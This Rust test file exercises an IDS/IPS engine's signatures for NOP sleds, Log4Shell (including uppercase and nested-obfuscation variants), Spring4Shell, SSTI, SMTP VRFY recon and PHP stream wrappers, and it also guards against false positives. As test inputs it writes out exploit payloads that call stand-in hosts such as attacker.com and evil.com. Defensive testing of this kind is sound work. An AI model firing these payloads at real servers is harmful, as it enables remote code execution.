//! Adversarial IDS / IPS engine tests.
//!
//! Critical properties under test://! - **Binary NOP sled** must be detected by actual 0x90 bytes (not ASCII text)
//! - **EHLO** must NOT fire as a false positive
//! - **IPS mode** must issue `Drop` verdict; IDS mode must downgrade to `Alert`
//! - **Log4Shell** `${jndi:` pattern must be caught
//! - **Spring4Shell** `class.module.classLoader` must be caught
//! - **SSTI** `{{7*7}}` must be caught
//! - **VRFY/EXPN** recon commands must trigger alerts

use ids_engine::{IdsConfig, IdsEngine, IdsVerdict};
use std::net::{IpAddr, Ipv4Addr};

// ── Helpers ───────────────────────────────────────────────────────────────────

fn src_ip() -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(10, 0, 0, 42))
}

fn ids_engine() -> IdsEngine {
    let mut cfg = IdsConfig::default();
    cfg.inline_mode = false; // detection only
    IdsEngine::new(cfg).expect("IDS engine init")
}

fn ips_engine() -> IdsEngine {
    let mut cfg = IdsConfig::default();
    cfg.inline_mode = true; // inline prevention mode
    IdsEngine::new(cfg).expect("IPS engine init")
}

// ── NOP sled (P0 regression) ─────────────────────────────────────────────────

/// The NOP sled signature uses actual 0x90 bytes.
/// Before the fix the pattern was the ASCII string `\x90\x90\x90\x90` (16 chars).
#[test]
fn test_nop_sled_actual_bytes_detected() {
    let engine = ids_engine();
    // Craft payload with real 0x90 bytes — the kind a shellcode would contain
    let mut payload = b"DATA\r\n".to_vec();
    payload.extend_from_slice(&[0x90u8; 16]); // 16 NOP bytes
    payload.extend_from_slice(b"\x31\xc0\x50\x68"); // dummy shellcode stub

    let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", &payload);
    let nop_alerts: Vec<_> = alerts.iter().filter(|a| a.id == 2000002).collect();
    assert!(
        !nop_alerts.is_empty(),
        "NOP sled (actual 0x90 bytes) must generate alert SID 2000002"
    );
}

/// ASCII text `\\x90\\x90` must NOT trigger the NOP sled signature.
/// If it does, the pattern is wrong (matches text, not binary).
#[test]
fn test_nop_sled_ascii_text_not_detected() {
    let engine = ids_engine();
    // This is the TEXT string "\\x90\\x90\\x90\\x90" — NOT actual 0x90 bytes
    let payload = b"DATA\r\n\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90";

    let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
    let nop_alerts: Vec<_> = alerts.iter().filter(|a| a.id == 2000002).collect();
    assert!(
        nop_alerts.is_empty(),
        "ASCII backslash-x90 text must NOT trigger binary NOP sled signature — P0 regression"
    );
}

// ── EHLO false-positive regression ───────────────────────────────────────────

/// Normal SMTP EHLO greeting must NEVER fire an alert.
/// SID 2000001 was removed because it fired on every legitimate connection.
#[test]
fn test_ehlo_no_false_positive() {
    let engine = ids_engine();
    let payload = b"EHLO mail.google.com\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
    assert!(
        !alerts.iter().any(|a| a.id == 2000001),
        "EHLO must NOT generate SID 2000001 false positive"
    );
}

// ── Modern vulnerability signatures ──────────────────────────────────────────

/// Log4Shell CVE-2021-44228:`${jndi:` lookup triggers remote code execution.
#[test]
fn test_log4shell_jndi_ldap() {
    let engine = ids_engine();
    let payload = b"GET /?name=${jndi:ldap://attacker.com/exploit} HTTP/1.1\r\n";
    let (verdict, alerts) = engine.inspect(src_ip(), 8080, "http", payload);
    assert!(
        !alerts.is_empty(),
        "Log4Shell ${{jndi:...}} must trigger an alert"
    );
    assert!(
        alerts.iter().any(|a| a.id == 2000012),
        "Expected SID 2000012 (Log4Shell) in alerts: {:?}",
        alerts.iter().map(|a| a.id).collect::<Vec<_>>()
    );
    // In IDS mode verdict should be Alert (not Drop since inline=false)
    assert_eq!(verdict, IdsVerdict::Alert);
}

/// Log4Shell DNS lookup variant.
#[test]
fn test_log4shell_jndi_dns() {
    let engine = ids_engine();
    let payload = b"X-Api-Version: ${jndi:dns://burpcollaborator.net/x}\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 443, "http", payload);
    assert!(
        !alerts.is_empty(),
        "Log4Shell via DNS jndi must be detected"
    );
}

/// Spring4Shell CVE-2022-22965:classLoader binding via HTTP parameters.
#[test]
fn test_spring4shell_classloader() {
    let engine = ids_engine();
    let payload = b"POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nclass.module.classLoader.urls[0]=jar:http://evil.com/exploit.jar!/";
    let (_, alerts) = engine.inspect(src_ip(), 8080, "http", payload);
    assert!(
        !alerts.is_empty(),
        "Spring4Shell class.module.classLoader must be detected"
    );
    assert!(
        alerts.iter().any(|a| a.id == 2000013),
        "Expected SID 2000013 (Spring4Shell)"
    );
}

/// Server-Side Template Injection `{{7*7}}` probe.
#[test]
fn test_ssti_probe() {
    let engine = ids_engine();
    let payload = b"GET /render?template={{7*7}} HTTP/1.1\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
    assert!(!alerts.is_empty(), "SSTI probe {{7*7}} must be detected");
}

/// VRFY recon command (enumerates valid users without authentication).
#[test]
fn test_smtp_vrfy_recon() {
    let engine = ids_engine();
    let payload = b"VRFY postmaster\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
    assert!(!alerts.is_empty(), "VRFY recon must be alerted");
    assert!(
        alerts.iter().any(|a| a.id == 2000003),
        "Expected SID 2000003"
    );
}

// ── IPS mode:inline Drop vs IDS mode:Alert downgrade ───────────────────────

/// In IPS mode (inline=true) a matching signature must yield `Drop` (not just Alert).
#[test]
fn test_ips_mode_yields_drop() {
    let engine = ips_engine();
    // Payload that matches the NOP sled signature
    let mut payload = b"DATA\r\n".to_vec();
    payload.extend_from_slice(&[0x90u8; 16]);

    let (verdict, alerts) = engine.inspect(src_ip(), 25, "smtp", &payload);
    assert!(!alerts.is_empty(), "NOP sled must be detected in IPS mode");
    assert_eq!(
        verdict,
        IdsVerdict::Drop,
        "IPS mode must issue Drop verdict, got {:?}",
        verdict
    );
}

/// In IDS mode (inline=false) the same matching payload MUST NOT yield Drop.
/// Drop is downgraded to Alert in detection-only mode.
#[test]
fn test_ids_mode_never_drops() {
    let engine = ids_engine();
    let mut payload = b"DATA\r\n".to_vec();
    payload.extend_from_slice(&[0x90u8; 16]);

    let (verdict, _alerts) = engine.inspect(src_ip(), 25, "smtp", &payload);
    assert_ne!(
        verdict,
        IdsVerdict::Drop,
        "IDS mode must NEVER issue a Drop verdict — would silently block in detection-only deployment"
    );
}

// ── Clean traffic guard ───────────────────────────────────────────────────────

/// Clean SMTP should pass without any alerts.
#[test]
fn test_clean_smtp_no_alerts() {
    let engine = ids_engine();
    let payload = b"MAIL FROM:<alice@example.com>\r\n";
    let (verdict, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
    assert!(
        alerts.is_empty(),
        "Clean SMTP MAIL FROM must not generate alerts"
    );
    assert_eq!(verdict, IdsVerdict::Pass);
}

// ── Case-sensitivity bypass regressions ──────────────────────────────────────
// Before adding `.ascii_case_insensitive(true)` to the Aho-Corasick builder,
// ALL text patterns were case-sensitive. `${JNDI:ldap://` (uppercase) and
// `vrfy admin` (lowercase) both bypassed detection entirely.
// These tests would have FAILED (attack allowed through) before the patch.

/// Log4Shell with ALL-UPPERCASE JNDI — previously bypassed `${jndi:` pattern.
#[test]
fn test_log4shell_uppercase_jndi_blocked() {
    let engine = ids_engine();
    let payload = b"GET /?x=${JNDI:ldap://attacker.com/exploit} HTTP/1.1\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 8080, "http", payload);
    assert!(
        !alerts.is_empty(),
        "`${{JNDI:ldap://...}}` uppercase JNDI must be detected — case-sensitivity regression"
    );
    assert!(
        alerts.iter().any(|a| a.id == 2000012),
        "Expected SID 2000012 (Log4Shell), got: {:?}",
        alerts.iter().map(|a| a.id).collect::<Vec<_>>()
    );
}

/// Log4Shell mixed-case `${JnDi:rmi://...}` — must also fire.
#[test]
fn test_log4shell_mixedcase_jndi_blocked() {
    let engine = ids_engine();
    let payload = b"User-Agent: ${JnDi:rmi://evil.example.com/payload}\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 443, "https", payload);
    assert!(
        !alerts.is_empty(),
        "`${{JnDi:rmi://...}}` mixed-case JNDI must be detected — case-sensitivity regression"
    );
}

/// SID 2000017 catches `jndi:ldap://` without the `${...}` wrapper.
/// This covers WAF/proxy bypass patterns where `${` is stripped upstream but
/// the raw JNDI URL survives, or where the injection is supplied as a plain URL.
#[test]
fn test_log4shell_raw_jndi_ldap_no_wrapper_detected() {
    let engine = ids_engine();
    // Raw JNDI URL — no `${...}` prefix. SID 2000012 requires `${jndi:` so only
    // SID 2000017 (pattern `jndi:ldap://`) fires here.
    let payload = b"GET /?redirect=jndi:ldap://attacker.com/exploit HTTP/1.1\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
    assert!(
        !alerts.is_empty(),
        "`jndi:ldap://` without wrapper must be detected by SID 2000017"
    );
    assert!(
        alerts.iter().any(|a| a.id == 2000017),
        "Expected SID 2000017 (bare jndi:ldap:// URL), got:{:?}",
        alerts.iter().map(|a| a.id).collect::<Vec<_>>()
    );
}

/// SID 2000090 now detects deeply nested `${j${::-n}di:ldap://...}` obfuscation.
/// The improved regex uses `.{0,50}` wildcards between each JNDI component letter
/// so it can cross inner `${::-X}` substitution boundaries that previously broke
/// the `[^\}]*` character class. This test verifies the bypass is caught.
#[test]
fn test_log4shell_deeply_obfuscated_known_bypass() {
    let engine = ids_engine();
    // `${j${::-n}di:ldap://...}` — nested substitution obfuscation
    let payload = b"GET /?x=${j${::-n}di:ldap://attacker.com/x} HTTP/1.1\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
    let fired_sids: Vec<u32> = alerts.iter().map(|a| a.id).collect();
    assert!(
        fired_sids.contains(&2000090),
        "SID 2000090 must detect nested `${{j${{::-n}}di:ldap://...}}` obfuscation; \
         got SIDs: {:?}",
        fired_sids,
    );
}

/// SID 2000017 IIOP variant:raw `jndi:iiop://` without `${...}` wrapper.
#[test]
fn test_log4shell_raw_jndi_iiop_detected() {
    let engine = ids_engine();
    // Plain JNDI IIOP URL — tests that SID 2000017 also covers non-ldap protocols.
    let payload = b"X-Forwarded-For: jndi:iiop://10.0.0.1:1099/malicious-object\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 443, "https", payload);
    assert!(
        !alerts.is_empty(),
        "`jndi:iiop://` raw URL must be detected by SID 2000017"
    );
    assert!(
        alerts.iter().any(|a| a.id == 2000017),
        "Expected SID 2000017 (jndi:iiop:// URL), got:{:?}",
        alerts.iter().map(|a| a.id).collect::<Vec<_>>()
    );
}

/// VRFY all-lowercase — previously bypassed `VRFY ` (uppercase) pattern.
#[test]
fn test_smtp_vrfy_lowercase_detected() {
    let engine = ids_engine();
    let payload = b"vrfy admin\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
    assert!(
        !alerts.is_empty(),
        "`vrfy admin` lowercase must be detected — case-sensitivity regression"
    );
    assert!(
        alerts.iter().any(|a| a.id == 2000003),
        "Expected SID 2000003 (VRFY recon), got: {:?}",
        alerts.iter().map(|a| a.id).collect::<Vec<_>>()
    );
}

/// VRFY mixed-case `Vrfy` — must also match.
#[test]
fn test_smtp_vrfy_mixedcase_detected() {
    let engine = ids_engine();
    let payload = b"Vrfy root\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
    assert!(
        !alerts.is_empty(),
        "`Vrfy root` mixed-case must be detected — case-sensitivity regression"
    );
}

/// AUTH PLAIN lowercase — previously bypassed `AUTH PLAIN ` uppercase pattern.
#[test]
fn test_smtp_auth_plain_lowercase_detected() {
    let engine = ids_engine();
    // base64 of "user:pass" – legitimate format but lowercase command should still match
    let payload = b"auth plain dXNlcjpwYXNz\r\n";
    let (_, alerts) = engine.inspect(src_ip(), 587, "smtp", payload);
    assert!(
        !alerts.is_empty(),
        "`auth plain ...` lowercase AUTH PLAIN must be detected — case-sensitivity regression"
    );
}

/// Spring4Shell all-uppercase `CLASS.MODULE.CLASSLOADER` — previously bypassed.
#[test]
fn test_spring4shell_uppercase_detected() {
    let engine = ids_engine();
    let payload = b"POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nCLASS.MODULE.CLASSLOADER.URLS[0]=jar:http://evil.com/e.jar!/";
    let (_, alerts) = engine.inspect(src_ip(), 8080, "http", payload);
    assert!(
        !alerts.is_empty(),
        "`CLASS.MODULE.CLASSLOADER` uppercase must be detected — case-sensitivity regression"
    );
    assert!(
        alerts.iter().any(|a| a.id == 2000013),
        "Expected SID 2000013 (Spring4Shell), got: {:?}",
        alerts.iter().map(|a| a.id).collect::<Vec<_>>()
    );
}

/// PHP stream wrapper `PHP://INPUT` uppercase — previously bypassed.
#[test]
fn test_php_stream_wrapper_uppercase_detected() {
    let engine = ids_engine();
    let payload = b"POST /upload.php HTTP/1.1\r\n\r\nfile=PHP://INPUT&cmd=system(\"id\")";
    let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
    assert!(
        !alerts.is_empty(),
        "`PHP://INPUT` uppercase php:// stream must be detected — case-sensitivity regression"
    );
}

// ── False-positive guard:case-insensitive must NOT over-match ────────────────

/// Normal SMTP EHLO must NEVER fire even with ascii_case_insensitive enabled.
/// Regression guard:adding case-insensitivity must not create new false positives.
#[test]
fn test_ehlo_still_no_false_positive_after_case_insensitive() {
    let engine = ids_engine();
    for payload in &[
        b"EHLO mail.gmail.com\r\n".as_ref(),
        b"ehlo mail.gmail.com\r\n".as_ref(),
        b"EHLO [192.168.1.1]\r\n".as_ref(),
    ] {
        let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
        assert!(
            !alerts.iter().any(|a| a.id == 2000001),
            "EHLO must never fire SID 2000001 (false positive guard)"
        );
    }
}

/// Normal RCPT TO must not match any signatures.
#[test]
fn test_rcpt_to_no_false_positive() {
    let engine = ids_engine();
    let payload = b"RCPT TO:<bob@example.com>\r\n";
    let (verdict, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
    assert!(
        alerts.is_empty(),
        "RCPT TO must not trigger any alerts, got: {:?}",
        alerts.iter().map(|a| a.id).collect::<Vec<_>>()
    );
    assert_eq!(verdict, IdsVerdict::Pass);
}

#[test]
fn test_rcpt_to_burst_detected() {
    let engine = ids_engine();
    let payload =
        b"RCPT TO:<a@example.com>\r\nRCPT TO:<b@example.com>\r\nRCPT TO:<c@example.com>\r\n";
    let (_verdict, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
    assert!(
        alerts.iter().any(|a| a.id == 3000007),
        "Expected SMTP RCPT burst anomaly (3000007), got: {:?}",
        alerts.iter().map(|a| a.id).collect::<Vec<_>>()
    );
}
